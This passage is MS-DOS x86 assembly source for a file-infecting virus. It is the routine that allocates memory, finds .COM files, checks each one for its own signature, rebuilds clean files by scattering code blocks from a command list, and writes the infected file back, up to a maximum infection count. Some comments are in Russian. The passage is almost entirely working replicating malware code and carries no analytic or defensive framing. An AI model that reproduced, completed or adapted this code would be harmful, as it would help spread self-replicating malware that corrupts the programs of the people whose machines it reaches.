mem:
@m1:    nop
@m2:    mov     ah,48h                  ; allocate mem for buf
@m3:    mov     bx,1000h
@m4:    int     21h
@m5:    jc      mem_not_ok
        lea     bp,@mem_ok
mem_not_ok:
@m6:    mov     ah,49h                  ; free mem
@m7:    int     21h
@m8:    mov     ah,48h                  ; get free mem size (bx)
@m9:    xor     bx,bx
@m10:   dec     bx
@m11:   int     21h
@m12:   sub     bx,1001h                ; reserve 1001h x 16 bytes
@m13:   mov     ah,48h                  ; allocate all other mem
@m14:   int     21h
@m15:   lea     bp,@mem
mem_ok:
@m16:   nop
@m17:   mov     cs:inf_q,0              ; infect count
@m18:   mov     segbuf,ax               ; segbuf = seg for buf
@m19:   mov     es,ax                   ; es = segbuf
@m20:   lea     si,msk                  ; [si] = '*.com',0
@m21:   mov     di,7Ah                  ;
@m22:   push    di
@m23:   movsw
@m24:   movsw
@m25:   movsw
@m26:   mov     ds,ax                   ; ds = segbuf

IFDEF   dbg
        prnstr  _mask
        prnaz   7Ah                     ; ds:dx
ENDIF

@m27:   mov     ah,1Ah                  ; set DTA to segbuf:80h
@m28:   mov     dx,di
@m29:   int     21h
find1st:
@m30:   mov     ah,4Eh                  ; find 1st file
@m31:   mov     cx,20h                  ; attr: archive
@m32:   pop     dx                      ; name = segbuf:7Ah
@m33:   int     21h
@m34:   jnc     find1st_ok
        lea     bp,@end_infect              ; err -> end infect

IFDEF   dbg
        jmp     findnext
ENDIF

find1st_ok:

IFDEF   dbg
        prnstr  _find1st
        prnaz   9Eh
        prnchr  13
        prnchr  10
ENDIF

findnext:
@m35:   nop
@m36:   mov     ds,cs:[segbuf]
@m37:   mov     ah,4Fh
@m38:   mov     dx,80h
@m39:   int     21h
@m40:   jnc     findnext_ok
        lea     bp,@end_infect

IFDEF   dbg
        jmp     @m41
ENDIF

findnext_ok:

IFDEF   dbg
        prnstr  _findnext
        prnaz   9Eh
ENDIF

@m41:   mov     dx,9Eh
@m42:   mov     ax,3d02h
@m43:   int     21h
@m44:   jnc     open_ok
        lea     bp,@findnext

IFDEF   dbg
        jmp     @m45
ENDIF

open_ok:

IFDEF   dbg
        prnstr  _open
ENDIF

@m45:   mov     cs:[handle],ax
@m46:   xchg    ax,bx
@m47:   mov     ah,3Fh
@m48:   mov     dx,100h
@m49:   mov     cx,0FFFFh
@m50:   int     21h
@m51:   mov     cs:[fsize],ax
@m52:   cmp     ax,10000h-(endvir-s)
        ja      bad_file
        cmp     ax,(endvir-s)
        ja      good_file
bad_file:

IFDEF   dbg
        prnstr  _badsize
ENDIF

        lea     bp,@close_file
good_file:
@m53:   push    ds
@m54:   push    cs
@m55:   pop     ds
@m56:   pop     es
@m57:   mov     si,100h
@m58:   push    si
@m59:   mov     di,si
@m60:   mov     cx,sign-s
@m61:   repe    cmpsb
@m62:   pop     si
@m63:   jne     clear_ok

IFDEF   dbg
        prnstr  _dirty
ENDIF
        lea     bp,@close_file

IFDEF   dbg
        jmp     @m64
ENDIF

clear_ok:
IFDEF   dbg
        prnstr  _clear
ENDIF

@m64:   mov     di,si
@m65:   mov     cx,vs
@m66:   rep     movsb
@m67:   lea     si,cmdlist

IFDEF   dbg
        prnstr  _generate
ENDIF

;================================

infect_by_next:
@m68:
        mov     [tab_index],si   ; si = ofs in cmdlist

IFDEF   dbg_t
        prnchr  '['
ENDIF

        lodsw
        push    ax               ; ax = ofs cmd
        xor     ax,ax
        lodsb
        mov     dx,ax            ; dx = len cmd
        pop     si               ; si = ofs cmd
        lea     di,dataend       ; di = ofs after VirMain & Data
        mov     cx,[fsize]       ; file len
        sub     cx,dataend-s     ; cx = cx - (VirMain & Data)
        sub     cx,dx            ; cx = cx - cmd.len
        inc     cx               ; cx = cx + 1  ;[?]
find_block:
        nop
        mov     al,byte ptr [si] ; al = 1st byte of cmd
        repne   scasb            ; find it in file
        jcxz    block_not_found
        jmp     chk_equ_block
block_not_found:

IFDEF   dbg
        prnchr  '-'
ENDIF

        mov     cx,dx            ; cx = cmd.len
        add     di,dx            ; di = ofs after end of file ; ???
        push    di
        add     [fsize],cx       ; file size = file size + cmd.len
        rep     movsb
        pop     di               ; di = ofs after end of file
        jmp     end_find_block
chk_equ_block:

IFDEF   dbg_t
        prnchr  '·'
ENDIF

        push    di
        push    si
        push    cx
        dec     di               ; di = ofs of may_be_equal cmd
        mov     cx,dx            ; cx = cmd.len
        repe    cmpsb            ;
        mov     ax,cx            ; ax = 0 if it's equal cmd
        pop     cx
        pop     si
        pop     di
        jne     find_block       ; af ax <> 0 - find again

IFDEF   dbg
        prnchr  '+'
ENDIF

        dec     di
end_find_block:
        mov     si,[tab_index]   ; si = ofs cmd in cmdlist

IFDEF   dbg_t
        prnchr  ']'
ENDIF

        xchg    di,si            ; di = ofs cmd in cmdlist ; si = new ofs cmd
        xchg    ax,si            ; ax = new ofs cmd ; si = ?
        stosw                    ; change ofs in cmdlist to new
        inc     di               ; skip cmd.len
        xchg    si,di            ; si = ofs next cmd in cmdlist
        cmp     si,ofs cmdlistend; end of cmdlist
        jne     infect_by_next   ; no -> next cmd

IFDEF   dbg
        prnstr  _generated
ENDIF
;================================
stop_infect:
@m69:   mov     bx,[handle]      ; bx = handle
@m70:   push    ds               ; ds = cs
@m71:   mov     ax,4200h
@m72:   cwd
@m73:   xor     cx,cx
@m74:   int     21h              ; lseek to begin
@m75:   mov     dx,[fsize]       ; dx = file size + not founded cmds
@m76:   mov     cx,dataend-s     ; длина VirMain & Data
@m77:   add     dx,101h          ; почему 101h а не 100h
@m78:   push    es
@m79:   pop     ds               ; ds = seg for allocate file
@m80:   mov     [oentry],dx      ;
@m81:   mov     ah,3Fh
@m82:   int     21h              ; read original begin
@m83:   add     dx,cx
@m84:   push    dx               ; dx = длина уже зараженного файла
@m85:   mov     ax,4200h
@m86:   cwd
@m87:   xor     cx,cx
@m88:   int     21h              ; lseek to begin
@m89:   mov     ah,40h
@m90:   pop     cx               ; cx = длина уже зараженного файла
@m91:   mov     dx,100h
@m92:   dec     ch               ; в файле = в памяти - 100h
@m93:   int     21h              ; save infected file
@m94:   pop     ds               ; ds = cs
@m95:   inc     cs:inf_q
close_file:
@m96:   nop
@m97:   mov     ah,3Eh

IFDEF   dbg
        prnstr  _close
ENDIF

@m98:   int     21h
@m99:   cmp     cs:inf_q,inf_max
@m100:  je      end_infect
        lea     bp,@findnext
end_infect:
@m101:  nop
@m102:  mov     es,[segbuf]

IFDEF   dbg
        prnstr  _ok
ENDIF

@m103:  mov     ah,49h
@m104:  int     21h
@m105:  push    cs
@m106:  pop     es
@m107:  mov     ah,49h
@m108:  int     21h
@m109:  mov     ah,48h
@m110:  mov     bx,0FFFFh
@m111:  int     21h
@m112:  mov     ah,48h
@m113:  int     21h
@m114:  mov     ah,1Ah                  ; restore DTA
@m115:  mov     dx,80h
@m116:  int     21h
@m117:  xor     bp,bp
@m118: